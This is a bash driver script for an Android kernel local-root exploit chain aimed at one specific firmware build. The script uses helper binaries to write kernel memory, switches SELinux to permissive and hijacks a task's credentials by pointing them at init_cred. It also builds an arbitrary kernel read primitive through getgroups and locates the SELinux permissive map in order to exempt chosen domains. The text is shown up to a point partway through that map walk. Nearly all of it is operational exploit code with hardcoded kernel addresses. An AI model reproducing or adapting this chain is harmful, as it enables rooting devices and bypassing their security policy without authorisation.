#!/usr/bin/env bash
# ARBITRARY READ on 7 with no crafted credential anywhere.
#
# Two measured facts make this the safe shape (ledger 491/492/499):
#   1. SyS_getgroups (fw/7/Image, offsets re-witnessed in art/task_offsets-7.tsv) reads
#      cred->group_info(+0x88) -> ngroups(+0x04) -> blocks[i/1024](+0x90) -> u32 words -> user buffer.
#      blocks[] is dereferenced as a KERNEL pointer, so a group_info we can write is a read channel.
#   2. A task whose cred is init_cred SURVIVES getgroups/prctl/getuid/stat/mmap/pipe2/write-on-an-
#      already-open-fd; it is only open()/fork()/setresuid()/execve() that this firmware executes.
# So: point cred at the REAL init_cred (all its own pointers are real), and aim init_cred's REAL
# group_info -- init_groups, a static .data object whose value we read out of the Image -- at whatever
# we want to read.  Nothing we write is a pointer the kernel might later kfree, which is what rebooted
# this box seven times when the cred was ours.
#
# Landing is proven, not assumed, at every step: init_cred->securebits=64 is the holder's own
# prctl(PR_GET_SECUREBITS) witness; ngroups=0/32 is its getgroups(0,NULL) witness (staged so the very
# first deref cannot hit a half-written blocks[]); and the calibration read is init_cred's own bytes,
# which are known OFFLINE from fw/7/Image -- a real known answer, not a self-reference.
#
# Memory state only: adb reboot restores factory.
set -eu
set -o pipefail

ROOT=$(cd "$(dirname "$0")" && pwd)
SER=${SER:-$(adb devices | awk 'NR==2 && $2=="device"{print $1}')}
ADB="adb -s $SER"

# Three of these runs have now been eaten by the HOST adb server wedging while the phone is perfectly
# alive (lsusb still shows it) -- and a wedged server makes every `adb shell` return the text "device
# not found", which the waits below used to count down as if they had polled the device.  SH() heals
# the server and retries, so "adb is broken" can never again be read as "the holder is not speaking".
SH() {
	local out t
	for t in 1 2 3 4; do
		out=$(adb -s $SER shell "$@" 2>&1 | tr -d '\r')
		case "$out" in
		*"not found"*|*"no devices"*|*"error: closed"*|*offline*)
			printf '  adb lost the device (try %d) -- restarting the host adb server\n' "$t" >&2
			adb kill-server >/dev/null 2>&1 || true; sleep 3; adb start-server >/dev/null 2>&1 || true; sleep 2
			continue;;
		esac
		printf '%s\n' "$out"
		return 0
	done
	# NOTHING on stdout when we gave up.  Run 46 proved why: the healed-but-still-failing text
	# "adb: device ... not found" landed in $(qlen), then in `[ ... -lt ... ]` (integer expected) and
	# in the node walk, so the map decode reported bits like 16777234 that were never in the map.
	# An error message is not a measurement.
	printf '  adb still unavailable after 4 restarts\n' >&2
	return 1
}
DEV=/data/local/tmp
OUT=$DEV/cred.txt
QF=$DEV/grp.txt
IMG=$ROOT/../fw/7/Image
TSV=$ROOT/../art/task_offsets-7.tsv

KREL=$(SH  uname -r 2>/dev/null | tr -d '\r' || true)
case "$KREL" in
  3.18.31-perf-g9dce1fbc9*)
    SELINUX_ENFORCING=0xffffffc001d5dbe4
    INIT_CRED=0xffffffc001a4ad08
    INIT_GROUPS=0xffffffc001a4af80	# = the .data literal sitting at init_cred+0x88 in this Image
    OFF_TASK_CRED=0x4c0; OFF_TASK_REALCRED=0x658; OFF_TASK_PID=0x490
    OFF_CRED_SB=0x24; OFF_CRED_USAGE=0x00; OFF_CRED_SEC=0x70; OFF_CRED_GRP=0x88
    OFF_CRED_CAPEFF=0x38; OFF_CRED_CAPBND=0x40
    OFF_GI_NGROUPS=0x04; OFF_GI_BLOCKS=0x90
    MODPROBE_PATH=0xffffffc001a499b8
    # policydb(0xffffffc001d61098)+0x1b0, the site security_compute_av feeds to ebitmap_get_bit.
    POLICYDB=0xffffffc001d61088	# derived: 3b found permissive_map at 0x1d61238 = here+0x1b0
			# (the value this profile used to carry, 0x1d61098, was 0x10 off)
    PERM_MAP=0xffffffc001d61248	# policydb+0x1b0 (the 6.0.1 offset) -- NOT trusted; 3b derives it
    # Host for our own ebitmap nodes: `argv_init` (0x1a419c0..0x1a41ad0, 272 B of boot-only pointers).
    # This used to say 0x1a41c00, which is INSIDE init_uts_ns -- the shipped ladder moved off it after
    # a run left `uname -a` reading "Linu@<bytes>" (ledger 555/broot7.c).  Both surfaces must name the
    # same host or the adb plant and the APK plant write different memory.
    NODE_BASE=0xffffffc001a419c0
    # types to make permissive.  servicemanager and system_server are here because per-domain permissive
    # is keyed on the SCONTEXT type, and a binder REPLY back to us is decided by the PEER's type --
    # without them a granted app gets uid=0 but every `pm`/`settings`/Shizuku call dies in
    # DeadObjectException while getenforce still says Enforcing (ledger 2026-10-21 §707).
    # Indices are the loaded policy's (art/policy-types-7-live.tsv); tools/exempt_bits_check.py gates
    # this line against tools/broot7.c's c7_want[].
    EXEMPT_BITS=9,192,279,593,743,1083,1156 ;;
  *) printf 'ABORT: kernel %s has no verified profile\n' "$KREL" >&2; exit 1 ;;
esac
ROUNDS=${ROUNDS:-8}; HOLD=${HOLD:-1500}; NICE=${NICE:-7}; BPFDS=${BPFDS:-14}
PERROUND=${PERROUND:-6}; NGRP=${NGRP:-32}; SBMARK=${SBMARK:-64}
TB=0xFFFFFFC000080000
# type index this firmware's `shell` domain has in the kernel's sid table (single source today:
# tools/policy_types.py walking fw/7's sepolicy).  step 6 checks it against the osid our OWN task is
# carrying -- that is the second source the table owes.
SHELL_SID=1083
# The group_info lives wholly inside modprobe_path[] (256 B, one page, and PROVABLY writable: its
# first bytes can be read back by any process through the sysctl).  init_groups was tried first and
# its blocks[0] slot sits on the far side of a page boundary (0x1a4af80+0x90 = 0x1a4b010) -- writes
# there report OK from clobber yet never land, which is what made the holder dereference the stale 1
# and reboot (runs 08/09).  Never trust a write whose landing has no witness on the same object.
# Fail-safe base (ledger 504): boot-only .data whose ngroups slot is ALREADY 0 and whose blocks[0]
# slot ALREADY holds a mapped pointer, so a write that does not land can only yield a wrong read --
# never an oops.  modprobe_path[] could not give that (its +0x90 is zeros), and init_groups straddled
# a page boundary whose far page is read-only.
GIVA=0xffffffc001a41b50

addr_add() { python3 -c "import sys; print(hex(int(sys.argv[1],16) + int(sys.argv[2],16)))" "$1" "$2"; }
le64_hex() { python3 -c "import sys; print(int(sys.argv[1],16).to_bytes(8,'little').hex())" "$1"; }
words2u64() { python3 -c "import sys; print(hex(int(sys.argv[2],16) << 32 | int(sys.argv[1],16)))" "$1" "$2"; }
inband() { python3 -c "import sys; v=int(sys.argv[1],16); sys.exit(0 if 0xffffff8000000000 <= v < 0xffffffd000000000 else 1)" "$1"; }
fire() { # addr hexpayload -- prints on STDERR on purpose: read_at() captures stdout and the ONLY
	 # bytes allowed in it are the holder's sample line.  Run 20 lost its calibration because these
	 # "write ... <- c0ffffff 30ada401" payload echoes were captured as the first six data words.
	local i
	case "$2" in
	''|*[!0-9a-fA-F]*) printf '  write %s : REJECTED payload %#q (a substitution failed -- not sent)\n' "$1" "$2" >&2; return 1;;
	esac
	if [ $(( ${#2} % 2 )) -ne 0 ] || [ ${#2} -gt 128 ]; then
		printf '  write %s : REJECTED payload length %s (need even, <=128 hex chars)\n' "$1" "${#2}" >&2
		return 1
	fi
	for i in 1 2 3; do
		if SH  "$DEV/clobber 14 kern $1 hex:$2 4 0" 2>&1 | tr -d '\r' | grep -q 'CLOBBER OK'; then
			printf '  write %-22s <- %-18s : OK (try %d)\n' "$1" "${2:0:18}" "$i" >&2
			return 0
		fi
	done
	printf '  write %s : no hit in three batches\n' "$1" >&2
	return 1
}
# A pointer goes in as two 4-byte halves, each retried: 8-byte writes have been the unreliable ones
# (ledger 503/504) and a half-landed pointer is exactly what dereferences into an oops.
fire_ptr() { # addr value64 -- TWO 4-byte halves, hi first.  SAFE ONLY for a slot that is not
	 # dereferenced between the two writes.  It is NOT safe for task->cred: run 25's manual variant
	 # parked 0xffffffc1_01a4ad08 in task+0x4c0 for one round trip, the holder's next syscall
	 # dereferenced it, and the box panic-rebooted (11th reboot, mine, not the plan's).  Anything a
	 # live pointer must be written in ONE 8-byte store -- same-alignment 64-bit str is atomic, and
	 # the driver's step 6 does exactly that for task->cred.
	local lo hi k
	lo=$(python3 -c "import sys;print(int(sys.argv[1],16)&0xffffffff)" "$2")
	hi=$(python3 -c "import sys;print(int(sys.argv[1],16)>>32)" "$2")
	for k in 1 2 3; do
		fire "$(addr_add "$1" 4)" "$(python3 -c "import struct;print(struct.pack('<I',$hi).hex())")" || true
		fire "$1" "$(python3 -c "import struct;print(struct.pack('<I',$lo).hex())")" || true
	done
}

gline() { SH  "grep -a '^GRP' $OUT 2>/dev/null" | tr -d '\r' | tail -n 1 || true; }
gcount() { local v; v=$(SH  "grep -ac '^GRP' $OUT 2>/dev/null" || true); case "$v" in ''|*[!0-9]*) printf '0\n';; *) printf '%s\n' "$v";; esac; }
# The read phase reports ONLY through the raw fd (no stdio, no allocation, no open): the driver must
# count THAT file, otherwise "the holder stopped printf-ing" and "the write never landed" look alike.
qlen() { local v; v=$(SH  "grep -ac '^GRP' $QF 2>/dev/null" || true); case "$v" in ''|*[!0-9]*) printf '0\n';; *) printf '%s\n' "$v";; esac; }
qline() { SH  "grep -a '^GRP' $QF 2>/dev/null" | tr -d '\r' | tail -n 1 || true; }
wlist() { printf '%s\n' "$1" | sed 's/.*n0=[0-9-]*//' | tr -s ' \n' '\n' | grep -E '^[0-9a-f]{8}$' || true; }
wAt() { printf '%s\n' "$(wlist "$1" | sed -n "$(( $2 / 4 + 1 ))p")"; }
LAST=""
read_at() { # aim -- re-aim blocks[0], re-borrow if the repair already took our cred back, and return
	# the first SETTLED sample whose words actually changed (a changed read is the witness that the
	# new aim landed; nothing here may assume "CLOBBER OK" means landed -- ledger 507).
	local L1="" L2="" k
	for k in 1 2 3 4 5; do
		fire_ptr "$(addr_add "$GIVA" $OFF_GI_BLOCKS)" "$1" || true
		if ! grep -q "uid=0" <<<"$(qline)"; then
			fire "$(addr_add "$TASK" $OFF_TASK_CRED)" "$(le64_hex $INIT_CRED)" || true
		fi
		local n=$(( $(qlen) + 1 )) w=0
		while [ "$(qlen)" -lt "$n" ] && [ "$w" -lt 10 ]; do sleep 2; w=$(( w + 1 )); done
		L1=$(qline)
		if [ -n "$L1" ] && [ "$L1" != "$LAST" ] && [ "$(wlist "$L1" | wc -l)" -ge "$NGRP" ]; then
			LAST=$L1; printf '%s\n' "$L1"; return 0
		fi
	done
	printf '%s\n' "${L1:-}"
	return 1
}

[ -x "$ROOT/broot" ] && [ -x "$ROOT/clobber" ] || { printf 'ABORT: build broot and clobber first\n' >&2; exit 1; }
for lit in 'GRP rc=' 'planted pair 0:' 'n0='; do
	grep -aq "$lit" "$ROOT/broot" || { printf 'ABORT: %s/broot lacks "%s" -- stale binary\n' "$ROOT" "$lit" >&2; exit 1; }
done
for f in broot clobber; do
	$ADB push "$ROOT/$f" "$DEV/$f" >/dev/null 2>&1 || { printf 'ABORT: push %s\n' "$f" >&2; exit 1; }
	SH  chmod 0755 "$DEV/$f" >/dev/null 2>&1 || true
done
python3 "$ROOT/task_offsets_7.py" >/dev/null || { printf 'ABORT: offset table would not re-decode\n' >&2; exit 1; }
for row in 'cred group_info 0x88' 'group_info ngroups 0x4' 'group_info blocks 0x90' \
           'task_struct cred 0x4c0' 'task_struct real_cred 0x658' 'task_struct pid 0x490' \
           'cred uid 0x4' 'cred cap_bset 0x40'; do
	set -- $row
	awk -F'\t' -v s="$1" -v f="$2" -v o="$3" '$1==s && $2==f && $3==o {hit=1} END{exit !hit}' "$TSV" \
		|| { printf 'ABORT: %s.%s@%s not witnessed in %s\n' "$1" "$2" "$3" "$TSV" >&2; exit 1; }
done
# init_cred's bytes as the Image ships them are the calibration answer, and init_groups must be the
# object init_cred actually points at -- both read out of the file, so a mistyped profile dies here
# rather than on the device.
python3 - "$IMG" "$INIT_CRED" "$INIT_GROUPS" "$TB" <<'PY'
import struct, sys
img, cred, gi, tb = sys.argv[1:5]
data = open(img, 'rb').read()
c = data[int(cred, 16) - int(tb, 16):]
assert struct.unpack_from('<I', c, 0)[0] == 4, "usage != 4: INIT_CRED is not init_cred"
assert struct.unpack_from('<Q', c, 0x30)[0] == 0x3fffffffff, "cap_permitted != full: not a cred"
p = struct.unpack_from('<Q', c, 0x88)[0]
assert p == int(gi, 16), "init_cred->group_info = %#x, but INIT_GROUPS says %#x" % (p, int(gi, 16))
assert struct.unpack_from('<I', c, 0x24)[0] == 0, "init_cred->securebits is not 0 in the Image"
assert struct.unpack_from('<I', c, 0x70)[0] == 0, "init_cred->security should be 0 in the Image (filled at boot)"
g = data[int(gi, 16) - int(tb, 16):]
assert struct.unpack_from('<I', g, 0)[0] == 2, "init_groups usage != 2: %#x is not init_groups" % struct.unpack_from('<I', g, 0)[0]
assert struct.unpack_from('<I', g, 4)[0] == 0, "init_groups ngroups is not 0 in the Image"
# blocks[0] reads as 1 in the Image -- dead precisely because ngroups==0 keeps GROUP_AT from ever
# touching it.  We overwrite it as part of arming the channel, so it must not be assumed 0.
print("  profile ok: init_cred usage=4 grp=%#x, init_groups usage=2 ngroups=0 (blocks[0]=%#x, dead)"
      % (p, struct.unpack_from('<Q', g, 0x90)[0]))
PY
printf 'kernel %s  init_cred=%s group_info=%s (modprobe page, writable+readable)  ngroups=%s\n' "$KREL" "$INIT_CRED" "$GIVA" "$NGRP"

printf '\n=== 0. permissive first (SKIP with ENFORCE_KEEP=1: the delivery shape must run under Enforcing) ===\n'
if [ "${ENFORCE_KEEP:-0}" = 1 ]; then
	printf '  ENFORCE_KEEP=1 -- not touching selinux_enforcing; getenforce = %s\n' \
		"$(SH  getenforce 2>/dev/null | tr -d '\r' || true)"
	GATE0=$(SH  getenforce 2>/dev/null | tr -d '\r' || true)
	[ "$GATE0" = Enforcing ] || { printf 'ABORT: ENFORCE_KEEP asked for Enforcing but the box says %s\n' "$GATE0" >&2; exit 1; }
elif ! SH  getenforce 2>/dev/null | tr -d '\r' | grep -q Permissive; then
	fire "$SELINUX_ENFORCING" 00000000 || exit 1
	GE=$(SH  getenforce 2>/dev/null | tr -d '\r' || true)
	printf '  getenforce now: %s\n' "$GE"
	[ "$GE" = Permissive ] || { printf 'ABORT: write said OK, getenforce still says %s\n' "$GE" >&2; exit 1; }
fi

printf '\n=== 1. needle: which task is ours ===\n'
LINE=""; TRIES=""
# There is exactly ONE needle launch per boot now.  Run 33 proved why: since run 22's rule "never kill
# a holder", a retry can only mean "the previous holder is still up", so every second attempt aborted
# on its own guard and the retry loop was a fiction -- and it wasted a whole run plus a reboot.
# Chances per launch therefore come from ROUNDS (more leak rounds inside ONE holder), not from ATTEMPTS.
for AT in $(seq 1 ${NEEDLE_ATTEMPTS:-1}); do
	STALE=$(SH  "pidof broot" 2>/dev/null | tr -d '\r' || true) || true
	if [ -n "$STALE" ]; then
		# NEVER kill a holder, including one this run launched itself.  Two reasons, both measured:
		#   1. exiting a task that borrowed init_cred is an unbilled put_cred(init_cred) (505/508);
		#   2. even a PRE-borrow holder carries the leak rounds' poisoned wait-queue entries, and its
		#      exit closes those fds -- run 23 did exactly that to a holder that had never been armed
		#      (every sample read uid=2000 securebits=0) and the box panic-rebooted (new boot_id,
		#      uptime 0 min).  So there is no safe kill at all; a reboot is the only reset.
		printf 'ABORT: holder %s is up and may carry poisoned wait queues -- do NOT kill it\n' "$STALE" >&2
		printf '       (run 23 killed one that had never borrowed and the box panic-rebooted).\n' >&2
		printf '       Run "adb reboot", wait for boot_completed, then run this again.\n' >&2
		exit 1
	fi
	printf '  attempt %s/%s (one launch per boot): holder up (ROUNDS=%s BPFDS=%s PERROUND=%s)\n' "$AT" "${NEEDLE_ATTEMPTS:-1}" "$ROUNDS" "$BPFDS" "$PERROUND"
	python3 - "$ROUNDS" "$NGRP" "$SBMARK" "$NICE" "$BPFDS" "$PERROUND" "$HOLD" <<'GENRB' > /tmp/rb7.sh
import sys
r, grp, sb, nice, bpfds, per, hold = sys.argv[1:8]
print('#!/system/bin/sh')
print('cd /data/local/tmp')
print('echo normal-probe > /data/local/tmp/normal.txt')
print('SPAN=0x400000 SIG=1 GRP=%s SBMARK=%s NICE=%s BPFDS=%s PERROUND=%s HOLD=%s /data/local/tmp/broot %s'
      % (grp, sb, nice, bpfds, per, hold, r))
print('echo "EXIT=$?"')
print('echo "DMESG-BEGIN"')
print('dmesg | tail -n 30')
print('echo "DMESG-END"')
print('echo "HOLDER-STILL-UP:"; pidof broot')
GENRB
	$ADB push /tmp/rb7.sh "$DEV/rb.sh" >/dev/null 2>&1 || { printf 'ABORT: push rb.sh\n' >&2; exit 1; }
	SH  "chmod 0755 $DEV/rb.sh; rm -f $OUT $QF $DEV/child.txt $DEV/inplace.txt $DEV/lad.txt $DEV/probe.uid" >/dev/null 2>&1 || true
	SH  "setsid nohup $DEV/rb.sh > $OUT 2>&1 < /dev/null &" >/dev/null 2>&1 || true
	for _ in $(seq 1 $((ROUNDS * 10))); do
		LINE=$(SH  "grep -a -m1 -oE 'TASKVA=0x[0-9a-f]+ pid=[0-9]+.*' $OUT 2>/dev/null" | tr -d '\r' || true) || true
		if [ -n "$LINE" ]; then break; fi
		NA=$(SH  "grep -ac 'no agreement yet' $OUT 2>/dev/null" 2>&1 | tr -d '\r' | tail -n 1 || true)
		if [ "${NA:-0}" -ge "$ROUNDS" ]; then printf '  attempt %s: all %s rounds published no agreement -- relaunching\n' "$AT" "$NA"; break; fi
		sleep 4
	done
	if [ -n "$LINE" ]; then break; fi
	FA=$(SH  "grep -ac 'attempt failed' $OUT 2>/dev/null" 2>&1 | tr -d '\r' | tail -n 1 || true)
	printf '  attempt %s: %s rounds failed to leak -- retrying\n' "$AT" "${FA:-?}"
	TRIES="$TRIES attempt$AT:failed_rounds=${FA:-?};no_agreement=$(SH  "grep -ac 'no agreement yet' $OUT 2>/dev/null" 2>&1 | tr -d '\r' | tail -n 1 || true)"
done
printf '  %s\n' "$LINE"
TASK=$(sed 's/^TASKVA=//; s/ .*//' <<<"$LINE")
HPID=$(sed 's/.* pid=//; s/ .*//' <<<"$LINE")
# A missing TASKVA means the holder never spoke (a wedged host adb server does exactly this: every SH()
# comes back empty), and without this guard the script carried on and ARMED init_cred's own fields --
# leaving the box half-patched, because the teardown table lives in a later branch (ledger 2026-10-21).
# Nothing has been written at this point, so refusing here costs nothing.
case "$TASK" in
  0x[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]*) ;;
  *) printf 'ABORT: no holder TASKVA (got "%s") -- the ladder never spoke, so NOTHING has been written. Heal the host adb server (adb kill-server; adb start-server) and re-run.\n' "$TASK" >&2; exit 1;;
esac

# NOTHING may be redirected until the holder is idle.  Its leak rounds call open("/dev/binder")
# every round, and open() is exactly what this firmware executes on a kernel-domain task (ledger
# 491/492) -- redirecting mid-round also tears down the UAF state underneath the poisoned wait queue,
# which is the most likely way the box went down on the last attempt.  The first GRP sample is the
# witness that the rounds are over and the holder is only doing cred-neutral syscalls now.
printf '\n=== 1b. wait until the holder is idle and sampling ===\n'
# A wall-clock deadline, not an iteration count: the host adb server wedges often on this box
# (ledger 511) and every failed `adb shell` still burns one of a fixed loop's iterations, so run 42
# expired a 480 s budget while the holder was legitimately still inside its leak rounds.
BASE=""
IDLE_END=$(( $(date +%s) + ${IDLE_WAIT:-1500} ))
while [ "$(date +%s)" -lt "$IDLE_END" ]; do
	sleep 5
	BASE=$(gline)
	if grep -q '^GRP rc=' <<<"$BASE"; then break; fi
done
grep -q '^GRP rc=' <<<"$BASE" || { printf 'ABORT: the holder never started sampling -- rounds still running or it is gone\n' >&2; exit 1; }
printf '  idle baseline: %s\n' "$BASE"

printf '\n=== 2. arm the whole channel BEFORE borrowing (ledger 507: the repair gives seconds) ===\n'
# THE RESTORE IS A TRAP, NOT A STEP.  Twice on 2026-10-21 an abort between here and the map plant
# (first an empty $TASK, then a holder that stopped sampling) exited the script and left init_cred
# armed -- securebits=the marker, group_info=our host, usage=0x11111111 -- and because kmod exec's the
# product's daemon with init_cred, that garbage is what the NEXT escalation would have inherited.
# `adb reboot` was the only undo, which is exactly the cost a trap is supposed to remove.
RESTORED=0
restore_borrowed() {
	local item addr pay
	[ "$RESTORED" = 1 ] && return 0
	RESTORED=1
	# values are the Image's own bytes for these .data objects, or explicit constants; every item is
	# `|| true` because one failed substitution must not skip the rest (ledger 659).
	for item in "$GIVA+$OFF_GI_NGROUPS:00000000" "$GIVA+$OFF_GI_BLOCKS:IMAGE" \
			"$(printf '0x%x' $((INIT_CRED + OFF_CRED_SB))):00000000" \
			"$(printf '0x%x' $((INIT_CRED + OFF_CRED_USAGE))):IMAGE" \
			"$(printf '0x%x' $((INIT_CRED + OFF_CRED_GRP))):IMAGE"; do
		addr=$(cut -d: -f1 <<<"$item"); pay=$(cut -d: -f2 <<<"$item")
		case "$pay" in
			IMAGE) pay=$(python3 -c "
import sys
img = open(sys.argv[1], 'rb').read()
off = int(sys.argv[2], 16) - 0xffffffc000080000
n = 8 if len(sys.argv[2]) else 4
print(img[off:off + 8].hex())" "$ROOT/../fw/7/Image" "$addr" 2>/dev/null || true) ;;
		esac
		addr=$(python3 -c "print(hex(eval(sys.argv[1])))" "$addr" 2>/dev/null || printf '%s' "$addr")
		[ -n "$pay" ] && { fire "$addr" "$pay" || true; printf '  restored %s <- %s\n' "$addr" "$pay"; }
	done
}
restore_on_exit() {
	if [ "${ARMED:-0}" = 1 ] && [ "$RESTORED" != 1 ]; then
		printf '  * the run is leaving without having restored -- restoring now\n' >&2
		restore_borrowed || true
	fi
}
trap restore_on_exit EXIT
ARMED=1
# ngroups=32, blocks[0] = the calibration target (init_cred+0x28, whose bytes we know from the Image),
# init_cred.group_info = our GI, init_cred.securebits = the holder's own poll marker.  Order matters:
# nothing is borrowed until all four are in place, so the FIRST sample after the borrow is a read.
fire "$(addr_add "$GIVA" $OFF_GI_NGROUPS)" "$(python3 -c "import struct;print(struct.pack('<I',$NGRP).hex())")" || exit 1
fire_ptr "$(addr_add "$GIVA" $OFF_GI_BLOCKS)" "$(addr_add "$INIT_CRED" 0x28)" || exit 1
fire_ptr "$(addr_add "$INIT_CRED" $OFF_CRED_GRP)" "$GIVA" || exit 1
fire "$(addr_add "$INIT_CRED" $OFF_CRED_SB)" "$(python3 -c "import struct;print(struct.pack('<I',$SBMARK).hex())")" || exit 1
fire "$(addr_add "$INIT_CRED" $OFF_CRED_USAGE)" "$(python3 -c "import struct;print(struct.pack('<I',0x11111111).hex())")" || exit 1

printf '\n=== 3. cred = init_cred (real_cred stays ours) ===\n'
BOOT0=$(SH  "cat /proc/sys/kernel/random/boot_id 2>/dev/null" | tr -d '\r' || true) || true
fire "$(addr_add "$TASK" $OFF_TASK_CRED)" "$(le64_hex $INIT_CRED)" || exit 1
SEEN="" C0=$(qlen) C1=0
BOR_END=$(( $(date +%s) + ${BORROW_WAIT:-300} ))
while [ "$(date +%s)" -lt "$BOR_END" ]; do
	sleep 3
	SEEN=$(qline)
	C1=$(qlen)
	if grep -q "sb=$SBMARK n0=$NGRP" <<<"$SEEN"; then break; fi
done
printf '  sampling: %s -> %s lines while the write was in flight\n' "$C0" "$C1"
printf '  sample: %s\n' "$SEEN"
grep -q "sb=$SBMARK n0=$NGRP" <<<"$SEEN" || {
	BOOT1=$(SH  "cat /proc/sys/kernel/random/boot_id 2>/dev/null" | tr -d '\r' || true) || true
	if [ "$BOOT1" = "$BOOT0" ] && [ "${C1:-0}" -gt "${C0:-0}" ]; then
		printf 'ABORT: still sampling (sample: %s) but securebits/ngroups never showed -- the write missed\n' "$SEEN" >&2
	elif [ "$BOOT1" = "$BOOT0" ]; then
		printf 'ABORT: sampling STOPPED (%s -> %s lines) with no reboot -- the holder is gone, so the witnesses cannot appear\n' "$C0" "$C1" >&2
	else
		printf 'ABORT: the device rebooted -- init_cred as cred is NOT the safe shape after all\n' >&2
	fi
	exit 1
}
printf '  PASS: this task is answering through init_cred (uid=%s securebits=%s ngroups=%s) and is ALIVE\n' \
	"$(sed 's/.*uid=\([0-9]*\).*/\1/' <<<"$SEEN")" "$SBMARK" "$NGRP"

# ---- optional read-only probe: use the channel WITHOUT touching the permissive map -------------
# The alias write path proved it changes .data but NOT the kernel image pages, and the probe then read
# the SAME bytes through both the primary and the alias VA (ledger 658) -- so only a write-then-read-
# back inside ONE ladder run separates "the image region is write-protected below the page tables" from
# "the site was wrong".  STEPS is that script: "r:<va>" reads, "w:<va>:<hexpayload>" writes.
# Teardown is deliberately built from a table and each item is `|| true`: one failed substitution must
# never skip the rest (a python base-10 slip left the box Permissive once -- ledger 659).
if [ -n "${STEPS:-}${READ_AT_VAS:-}" ]; then
	printf '\n=== 3r. probe mode (reads/writes only; the permissive map is never touched) ===\n'
	for s in ${STEPS:-} $(for v in ${READ_AT_VAS:-}; do printf 'r:%s ' "$v"; done); do
		kind=$(cut -d: -f1 <<<"$s"); arg=$(cut -d: -f2 <<<"$s"); pay=$(cut -d: -f3 <<<"$s")
		case "$kind" in
			r)
				if L=$(read_at "$arg"); then
					printf '  READ %s\n' "$arg"
					printf '%s\n' "$L" | python3 -c "
import sys, re
line = sys.stdin.read()
ws = re.findall(r'[0-9a-f]{8}', line.split('n0=')[-1])
words = [int(w, 16) for w in ws]
b = b''.join(__import__('struct').pack('<I', v) for v in words)
print('    words: %s' % ' '.join(ws))
print('    ascii: %s' % ''.join(chr(c) if 32 <= c < 127 else '.' for c in b))"
				else
					printf '  READ %s : NO READ -- the channel stopped answering, trust nothing after this\n' "$arg"
				fi;;
			w) if fire "$arg" "$pay"; then printf '  WRITE %s <- %s landed\n' "$arg" "$pay"; else printf '  WRITE %s : NO HIT\n' "$arg"; fi;;
			*) printf '  bad step: %s\n' "$s";;
		esac
	done
	printf '\n=== 9. give every borrowed field back (probe mode) ===\n'
	restore_borrowed
	fire_ptr "$(addr_add "$INIT_CRED" $OFF_CRED_GRP)" "$INIT_GROUPS" || true
	if [ "${ENFORCE_KEEP:-0}" != 1 ]; then
		printf '  putting Enforcing back\n'
		fire "$SELINUX_ENFORCING" 01000000 || true
		printf '  getenforce now: %s\n' "$(SH getenforce 2>/dev/null | tr -d '\r' || true)"
	fi
	printf '  probe done\n'
	exit 0
fi

rm -f /tmp/permmap_cands.txt
printf '\n=== 3b. permissive_map: derive the head from the live read, merge, plant, verify, then put Enforcing back on ===\n'
# Everything here happens inside the permissive window from step 0, because the READ channel only
# exists while cred = init_cred (that borrow is what makes getgroups our read primitive) and under
# Enforcing that borrow is what killed the holder (ledger 523).  Enforcing is switched back on only
# after the map is planted AND decoded back out of kernel memory -- so the holder still living at that
# point is the witness for the head address, the ebitmap layout and type index 192 == kernel at once.
POLICYDB_OFF=0x1b0	# measured on 6.0.1: permissive_map = policydb + 0x1b0.  Used to RANK candidates,
			# never as an assumption: run 40 read zeros at the literal address, so the 7
			# POLICYDB symbol is off by something and the head has to be found.
CANDS=""
for k in $(seq -14 24); do
	TRY=$(python3 -c "print(hex(int('$POLICYDB',16) + $k*0x80))")
	W=$(read_at "$TRY") || continue
	WS=$(wlist "$W" | tr -s '\n' ' ')
	C=$(python3 "$ROOT/permmap7.py" find --hex "$WS" --at "$TRY" || true)
	[ -n "$C" ] || continue
	printf '%s\n' "$C" | while read -r L; do printf '%s\n' "$L"; done >> /tmp/permmap_cands.txt
	printf '  %s\n' "$(printf '%s\n' "$C" | tr '\n' ';')"
done
[ -s /tmp/permmap_cands.txt ] || { printf 'ABORT: no ebitmap head anywhere in %s-0x700..+0xC00 -- the POLICYDB symbol itself is wrong\n' "$POLICYDB" >&2; rm -f /tmp/permmap_cands.txt; exit 1; }
# policydb carries several ebitmaps, so "walks like a head" is not enough.  Rank by distance to the
# 6.0.1 offset: the far candidates (highbit 1213/1536) read like item COUNTS, and 384 like a real
# permissive-map highbit (few, low-numbered types).
PICK=$(python3 - "$POLICYDB" "$POLICYDB_OFF" /tmp/permmap_cands.txt <<'PICKPY'
import sys
pol, off, path = sys.argv[1], int(sys.argv[2], 16), sys.argv[3]
want = int(pol, 16) + off
rows = []
for line in open(path):
    f = dict(t.split("=", 1) for t in line.replace("CANDIDATE ", "").split() if "=" in t)
    if "addr" not in f or "highbit" not in f:
        continue
    rows.append((abs(int(f["addr"], 16) - want), f))
if not rows:
    sys.exit("no parseable candidates")
rows.sort(key=lambda r: r[0])
d, f = rows[0]
print("%s %s %s %s %d" % (f["addr"], f.get("order", "node@0"), f["node"], f["highbit"], d))
PICKPY
) || { printf 'ABORT: candidate ranking failed\n' >&2; exit 1; }
read -r PERM_MAP MAPORDER NODEPTR HIGHBIT DIST <<<"$PICK"
printf '  CHOSEN head @%s (%s) node=%s highbit=%s -- %s bytes from policydb+%s; alternatives stayed on record above\n' \
	"$PERM_MAP" "$MAPORDER" "$NODEPTR" "$HIGHBIT" "$DIST" "$POLICYDB_OFF"
MH=$(read_at "$PERM_MAP") || { printf 'ABORT: the chosen head stopped reading\n' >&2; exit 1; }
HD=$(python3 "$ROOT/permmap7.py" decode --head "$(wlist "$MH" | tr -s '\n' ' ')" || true)
printf '%s\n' "$HD" | sed 's/^/  live map: /'
# walk the EXISTING chain so we add bits instead of dropping whoever the vendor already exempts
NODEARGS=""
NP="$NODEPTR"
for i in 1 2 3 4; do
	[ -n "$NP" ] && [ "$NP" != "0x0" ] || break
	NL=$(read_at "$NP") || break
	NH=$(wlist "$NL" | tr -d ' \n'); NH=${NH:0:128}	# one read = 256 hex chars; a node is 64 B
	[ ${#NH} -eq 128 ] || { printf '  walk stopped at %s (%s hex chars)\n' "$NP" "${#NH}"; break; }
	NODEARGS="$NODEARGS --node $NH"
	printf '  %s\n' "$(python3 "$ROOT/permmap7.py" node --hex "$NH" || true)"
	NP=$(python3 "$ROOT/permmap7.py" node --hex "$NH" | sed -n 's/.*NEXT=\(0x[0-9a-f]*\).*/\1/p')
done
